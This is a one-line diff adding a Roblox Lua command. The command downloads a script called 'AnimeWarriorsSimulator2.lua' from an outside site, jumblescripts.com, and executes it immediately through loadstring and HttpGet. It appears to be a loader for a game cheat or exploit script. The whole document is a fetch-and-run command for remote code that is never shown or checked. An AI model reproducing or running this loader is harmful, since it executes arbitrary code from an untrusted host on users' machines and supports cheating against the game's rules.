@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://jumblescripts.com/AnimeWarriorsSimulator2.lua"))()
